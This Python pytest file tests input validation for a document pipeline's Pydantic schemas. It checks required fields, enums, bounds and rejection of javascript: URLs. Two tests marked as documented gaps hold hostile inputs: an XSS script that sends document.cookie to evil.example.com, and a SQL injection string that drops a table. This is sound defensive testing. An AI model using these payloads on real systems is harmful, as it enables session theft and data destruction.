"""
Security tests for input validation across all pipeline schemas and admin routes.

Covers:
- Required field enforcement (Pydantic validation errors on missing fields)
- Enum membership enforcement (DataSource, TaxonomyTag)
- Numeric bounds (confidence [0,1], keyword count [5,10])
- String sanitisation for URL, image_url, summary, bm25_keywords
- SQL/XSS injection surface in schema fields (Pydantic accepts these — gaps documented)
- Admin route query-parameter boundary enforcement
"""

from __future__ import annotations

import pytest
from fastapi.testclient import TestClient
from pydantic import ValidationError

from admin_api.main import app

client = TestClient(app, headers={"X-Admin-Key": "test-admin-key-for-tests"})


# ── RawDocument validation ────────────────────────────────────────────────────


class TestRawDocumentValidation:
    def _valid(self, **overrides: object) -> dict:
        base = {
            "title": "Flash Attention 3: Optimizing Transformer Inference",
            "url": "https://example.com/flash-attention-3",
            "body": " ".join(["word"] * 320),
            "source": "arxiv",
            "source_id": "2401.12345",
        }
        base.update(overrides)
        return base

    def test_url_is_required(self) -> None:
        from src.schemas import RawDocument

        with pytest.raises(ValidationError, match="url"):
            RawDocument.model_validate({**self._valid(), "url": None})

    def test_body_is_required(self) -> None:
        from src.schemas import RawDocument

        with pytest.raises(ValidationError):
            RawDocument.model_validate({k: v for k, v in self._valid().items() if k != "body"})

    def test_title_is_required(self) -> None:
        from src.schemas import RawDocument

        with pytest.raises(ValidationError):
            RawDocument.model_validate({k: v for k, v in self._valid().items() if k != "title"})

    def test_source_must_be_valid_enum_member(self) -> None:
        from src.schemas import RawDocument

        with pytest.raises(ValidationError, match="source"):
            RawDocument.model_validate({**self._valid(), "source": "invalid_source"})

    def test_unknown_source_string_rejected(self) -> None:
        from src.schemas import RawDocument

        with pytest.raises(ValidationError):
            RawDocument.model_validate({**self._valid(), "source": "twitter"})

    def test_all_valid_sources_accepted(self) -> None:
        from src.schemas import DataSource, RawDocument

        for source in DataSource:
            doc = RawDocument.model_validate({**self._valid(), "source": source.value})
            assert doc.source == source

    def test_url_hash_is_sha256_hex(self) -> None:
        import hashlib

        from src.schemas import RawDocument

        doc = RawDocument.model_validate(self._valid())
        expected = hashlib.sha256(doc.url.encode()).hexdigest()
        assert doc.url_hash == expected
        assert len(doc.url_hash) == 64

    def test_javascript_url_is_rejected(self) -> None:
        """javascript: URLs must be rejected by the url validator."""
        from src.schemas import RawDocument

        with pytest.raises(ValidationError, match="url"):
            RawDocument.model_validate({**self._valid(), "url": "javascript:alert(1)"})

    def test_empty_body_is_rejected(self) -> None:
        from src.schemas import RawDocument

        doc = RawDocument.model_validate({**self._valid(), "body": ""})
        # Empty body produces word_count=0 and should fail bouncer, not schema
        assert doc.word_count == 0

    def test_source_id_optional(self) -> None:
        from src.schemas import RawDocument

        doc = RawDocument.model_validate({**self._valid(), "source_id": None})
        assert doc.source_id is None


# ── ExtractedDocument validation ──────────────────────────────────────────────


class TestExtractedDocumentValidation:
    def _valid(self, **overrides: object) -> dict:
        base = {
            "summary": "First sentence. Second sentence. Third sentence.",
            "bm25_keywords": ["Flash", "Attention", "H100", "CUDA", "BF16"],
            "taxonomy_tags": ["AI Engineering"],
            "image_url": None,
        }
        base.update(overrides)
        return base

    def test_valid_document_accepted(self) -> None:
        from src.schemas import ExtractedDocument

        doc = ExtractedDocument.model_validate(self._valid())
        assert doc is not None

    def test_too_few_keywords_rejected(self) -> None:
        from src.schemas import ExtractedDocument

        with pytest.raises(ValidationError, match="bm25_keywords"):
            ExtractedDocument.model_validate({**self._valid(), "bm25_keywords": []})

    def test_too_many_keywords_rejected(self) -> None:
        from src.schemas import ExtractedDocument

        with pytest.raises(ValidationError, match="bm25_keywords"):
            ExtractedDocument.model_validate({
                **self._valid(),
                "bm25_keywords": [f"kw{i}" for i in range(11)],
            })

    def test_exactly_five_keywords_accepted(self) -> None:
        from src.schemas import ExtractedDocument

        doc = ExtractedDocument.model_validate({
            **self._valid(),
            "bm25_keywords": ["k1", "k2", "k3", "k4", "k5"],
        })
        assert len(doc.bm25_keywords) == 5

    def test_exactly_ten_keywords_accepted(self) -> None:
        from src.schemas import ExtractedDocument

        doc = ExtractedDocument.model_validate({
            **self._valid(),
            "bm25_keywords": [f"kw{i}" for i in range(10)],
        })
        assert len(doc.bm25_keywords) == 10

    def test_invalid_taxonomy_tag_rejected(self) -> None:
        from src.schemas import ExtractedDocument

        with pytest.raises(ValidationError):
            ExtractedDocument.model_validate({
                **self._valid(),
                "taxonomy_tags": ["NotATag"],
            })

    def test_whitespace_keywords_stripped(self) -> None:
        from src.schemas import ExtractedDocument

        doc = ExtractedDocument.model_validate({
            **self._valid(),
            "bm25_keywords": ["  Flash  ", " Attention ", "H100", "CUDA", "BF16"],
        })
        assert doc.bm25_keywords[0] == "Flash"
        assert doc.bm25_keywords[1] == "Attention"

    def test_empty_keywords_removed_by_validator_but_length_checked_first(self) -> None:
        """
        Pydantic v2 checks min_length BEFORE the field validator runs.
        A 5-element list passes min_length=5, then the validator strips empty strings
        leaving 3 items — no re-validation of length occurs after the validator.
        This is an important edge case: the validated doc ends up with fewer than 5 keywords.
        """
        from src.schemas import ExtractedDocument

        # min_length=5 passes (5 items), validator strips empties → result has 3 keywords
        doc = ExtractedDocument.model_validate({
            **self._valid(),
            "bm25_keywords": ["", "", "k1", "k2", "k3"],
        })
        # After stripping, only 3 keywords remain
        assert len(doc.bm25_keywords) == 3
        assert "" not in doc.bm25_keywords

    def test_javascript_image_url_is_rejected(self) -> None:
        """javascript: image_url must be rejected by the image_url validator."""
        from src.schemas import ExtractedDocument

        with pytest.raises(ValidationError, match="image_url"):
            ExtractedDocument.model_validate({
                **self._valid(),
                "image_url": "javascript:alert(document.cookie)",
            })

    def test_summary_over_2000_chars_rejected(self) -> None:
        """Summary must not exceed 2000 characters."""
        from src.schemas import ExtractedDocument

        with pytest.raises(ValidationError, match="summary"):
            ExtractedDocument.model_validate({**self._valid(), "summary": "x" * 2001})

    def test_xss_payload_in_summary_accepted(self) -> None:
        """
        SECURITY GAP (documented): summary has no content sanitisation.
        XSS payloads pass model validation without modification.
        Fix: sanitise or escape summary content before rendering in the web UI.
        """
        from src.schemas import ExtractedDocument

        xss = "<script>document.location='https://evil.example.com?c='+document.cookie</script>"
        doc = ExtractedDocument.model_validate({**self._valid(), "summary": xss})
        assert doc.summary == xss

    def test_sql_injection_in_keyword_accepted_by_pydantic(self) -> None:
        """
        SECURITY GAP (documented): bm25_keywords has no SQL injection filtering.
        The storage layer uses parameterised queries, but if keywords are ever
        interpolated into raw SQL, injection would be possible.
        Fix: validate that keywords contain only printable ASCII/unicode letters.
        """
        from src.schemas import ExtractedDocument

        injection = "'; DROP TABLE generator_documents; --"
        doc = ExtractedDocument.model_validate({
            **self._valid(),
            "bm25_keywords": [injection, "k2", "k3", "k4", "k5"],
        })
        assert doc.bm25_keywords[0] == injection


# ── MetadataGatekeeperResult validation ──────────────────────────────────────


class TestMetadataGatekeeperResultValidation:
    def _valid(self, **overrides: object) -> dict:
        base = {"is_high_signal": True, "confidence": 0.85}
        base.update(overrides)
        return base

    def test_valid_result_accepted(self) -> None:
        from src.schemas import MetadataGatekeeperResult

        r = MetadataGatekeeperResult.model_validate(self._valid())
        assert r.passes is True

    def test_confidence_below_zero_rejected(self) -> None:
        from src.schemas import MetadataGatekeeperResult

        with pytest.raises(ValidationError, match="confidence"):
            MetadataGatekeeperResult.model_validate({**self._valid(), "confidence": -0.01})

    def test_confidence_above_one_rejected(self) -> None:
        from src.schemas import MetadataGatekeeperResult

        with pytest.raises(ValidationError, match="confidence"):
            MetadataGatekeeperResult.model_validate({**self._valid(), "confidence": 1.01})

    def test_confidence_exactly_zero_accepted(self) -> None:
        from src.schemas import MetadataGatekeeperResult

        r = MetadataGatekeeperResult.model_validate({**self._valid(), "confidence": 0.0})
        assert r.confidence == 0.0

    def test_confidence_exactly_one_accepted(self) -> None:
        from src.schemas import MetadataGatekeeperResult

        r = MetadataGatekeeperResult.model_validate({**self._valid(), "confidence": 1.0})
        assert r.confidence == 1.0

    def test_passes_requires_both_high_signal_and_high_confidence(self) -> None:
        from src.schemas import MetadataGatekeeperResult

        # high_signal=True but confidence below threshold
        r = MetadataGatekeeperResult.model_validate({"is_high_signal": True, "confidence": 0.5})
        assert r.passes is False

        # confidence above threshold but not high signal
        r2 = MetadataGatekeeperResult.model_validate({"is_high_signal": False, "confidence": 0.9})
        assert r2.passes is False

        # both met
        r3 = MetadataGatekeeperResult.model_validate({"is_high_signal": True, "confidence": 0.6})
        assert r3.passes is True

    def test_confidence_threshold_exactly_0_6(self) -> None:
        from src.schemas import MetadataGatekeeperResult

        at_threshold = MetadataGatekeeperResult.model_validate(
            {"is_high_signal": True, "confidence": 0.6}
        )
        just_below = MetadataGatekeeperResult.model_validate(
            {"is_high_signal": True, "confidence": 0.59}
        )
        assert at_threshold.passes is True
        assert just_below.passes is False


# ── StoragePayload validation ─────────────────────────────────────────────────


class TestStoragePayloadValidation:
    def _valid(self) -> dict:
        return {
            "source": "arxiv",
            "url": "https://example.com/paper",
            "url_hash": "a" * 64,
            "content_hash": "b" * 64,
            "title": "Test paper",
            "summary": "Summary here.",
            "bm25_keywords": ["k1", "k2", "k3", "k4", "k5"],
            "taxonomy_tags": ["AI Engineering"],
            "gatekeeper_confidence": 0.85,
        }

    def test_valid_payload_accepted(self) -> None:
        from src.schemas import StoragePayload

        p = StoragePayload.model_validate(self._valid())
        assert p is not None

    def test_invalid_source_rejected(self) -> None:
        from src.schemas import StoragePayload

        with pytest.raises(ValidationError):
            StoragePayload.model_validate({**self._valid(), "source": "unknown_source"})

    def test_pipeline_status_defaults_to_stored(self) -> None:
        from src.schemas import StoragePayload

        p = StoragePayload.model_validate(self._valid())
        assert p.pipeline_status == "stored"

    def test_processed_at_defaults_to_utc_now(self) -> None:
        from datetime import UTC, datetime

        from src.schemas import StoragePayload

        before = datetime.now(UTC)
        p = StoragePayload.model_validate(self._valid())
        after = datetime.now(UTC)
        assert before <= p.processed_at <= after
